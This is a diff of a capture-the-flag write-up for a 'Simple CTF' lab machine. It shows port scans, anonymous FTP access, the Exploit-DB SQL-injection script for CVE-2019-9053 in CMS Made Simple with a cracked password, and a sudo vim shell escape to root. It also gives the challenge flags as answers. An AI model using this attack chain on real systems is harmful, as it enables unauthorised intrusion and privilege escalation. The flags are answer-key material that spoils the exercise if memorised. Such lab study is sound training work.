@@ -8,11 +8,11 @@
 - [100k Most used passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt)
 
 ## Task 1: Simple CTF
-1. How many services are running under port 1000?
+### 1. How many services are running under port 1000?
 ```
 2
 ```
-First, we do an nmap scan to the machine, checking for all ports.
+First, we do an nmap scan to the machine, checking for all ports.\
 __nmap output__:
 ```
 > nmap -sT -p- 10.10.253.82
@@ -26,11 +26,11 @@ PORT     STATE SERVICE
 ```
 We find ports 21 and 80, which are under 1000.
 
-2. What is running in the higher port?
+### 2. What is running in the higher port?
 ```
 ssh
 ```
-We now do an nmap scan to the highestt port, which is 2222.
+We now do an nmap scan to the highestt port, which is 2222.\
 __nmap output__:
 ```
 > nmap -sV -p 2222 10.10.253.82
@@ -48,17 +48,17 @@ Another alternative for the nmap scan could be:
 nmap -A -T4 -p- 10.10.x.x
 ```
 
-3. What's the CVE you're using against the application?
+### 3. What's the CVE you're using against the application?
 ```
 CVE-2019-9053
 ```
 
-4. To what kind of vulnerability is the application vulnerable?
+### 4. To what kind of vulnerability is the application vulnerable?
 ```
 SQLi
 ```
 
-First, we are going to acces the ftp service through the user 'anonymous'. Inside the ftp we find a text file with important information. We ge the file and transfer it to our computer so we can read it.
+First, we are going to acces the ftp service through the user 'anonymous'. Inside the ftp we find a text file with important information. We get the file and transfer it to our computer so we can read it.
 ```bash
 kali@kali:~$ ftp 10.10.253.82
 Connected to 10.10.253.82.
@@ -90,10 +90,11 @@ kali@kali:~$ cat ForMitch.txt
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
 
-We exit out of ftp and proceed to the main page in port 80 (http) which is Apache. 
+We exit out of ftp and proceed to the main page in port 80 (http) which is Apache.\
 Url: `10.10.219.145/index.html`
 
-We are going to run a __gobuster__ scan to find useful directories.
+We are going to run a __gobuster__ scan to find useful directories.\
+__gobuster output__
 ```bash
 kali@kali:~$ gobuster dir -u 10.10.219.145 -w /usr/share/wordlists/dirb/common.txt -t 15 -x php,html,txt -q
 /.htaccess            (Status: 403) [Size: 297]
@@ -115,7 +116,7 @@ kali@kali:~$ gobuster dir -u 10.10.219.145 -w /usr/share/wordlists/dirb/common.t
 /server-status        (Status: 403) [Size: 301]  
 /simple               (Status: 301) [Size: 315] [--> http://10.10.219.145/simple/]
 ```
-When we inspect the /simle directory, we find __CMS Made Simple__. The version can be found in the footer of the page.
+When we inspect the __/simple__ directory, we find __CMS Made Simple__. The version can be found in the footer of the page.
 If we search for this CVE: `CMS Made Simple 2.2.8 cve` we find a vulnerability to SQL Injection.
 
 5. What's the password?
@@ -130,11 +131,11 @@ ssh
 
 We then find the [Exploit Database](https://www.exploit-db.com/exploits/46635) entry with some python code.
 
-python command:
+__python command:__
 ```bash
 python 46635.py -u http://10.10.116.229/simple --crack -w 100kcommon.txt
 ```
-output:
+__output:__
 ```
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
@@ -150,33 +151,33 @@ When promped for the password, write: `secret`.
 
 We are now logged in as mitch.
 
-7. What's the user flag?
+### 7. What's the user flag?
 ```
 G00d j0b, keep up!
 ```
 If we do `ls` once we are logged in, we can find a file called __user.txt__. If we cat it out we find the user flag.
 
-8. Is there any other user in the home directory? What's its name?
+### 8. Is there any other user in the home directory? What's its name?
 ```
 sunbath
 ```
 In our current folder, jump back a directory with `cd ..`. Now do an `ls` to see the contents of the home folder. 
 We should see another user called __sunbath__.
 
-9. What can you leverage to spawn a privileged shell?
+### 9. What can you leverage to spawn a privileged shell?
 ```
 vim
 ```
 To see what our sudo privileges are, we can run `sudo -l`. After running it we can see that we have acces to vim, and we can exploit that to get root access.
-If we search for vim in GTFOBins, and go to the sudo section we see a potential payload that we can use.
+If we search for vim in __GTFOBins__, and go to the sudo section we see a potential payload that we can use.
 
-__payload__
+__payload:__
 ```bash
 sudo vim -c ':!/bin/sh'
 ```
 After running it, we should have root access.
 
-10. What's the root flag?
+### 10. What's the root flag?
 ```
 W3ll d0n3. You made it!
 ```
